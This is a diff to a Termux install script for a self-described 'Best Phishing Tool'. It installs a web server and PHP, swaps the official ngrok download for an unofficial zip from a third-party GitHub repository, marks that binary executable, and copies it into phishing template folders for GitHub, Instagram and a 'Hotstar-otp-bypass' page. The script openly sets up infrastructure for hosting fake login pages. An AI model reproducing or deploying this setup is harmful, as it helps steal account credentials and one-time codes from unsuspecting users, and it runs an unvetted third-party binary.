@@ -5,6 +5,7 @@ echo
 echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Best Phishing Tool Please Wait \e[0m"
 echo
 termux-setup-storage
+pkg update > dev/null 2>&1
 apt-get install apache2 -y
 apt install php -y
 apt install jq -y
@@ -13,8 +14,9 @@ apt install zip -y
 pkg install wget -y
 pkg install ncurses-utils -y
 clear
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
-unzip ngrok-stable-linux-arm.zip
+wget https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip
+unzip Ngrok_Linux_Droid.zip && rm -rf Ngrok_Linux_Droid.zip
+chmod +x ngrok
 cp -R ngrok phs/github/
 cp -R ngrok phs/Hotstar-otp-bypass/
 cp -R ngrok phs/instagram/
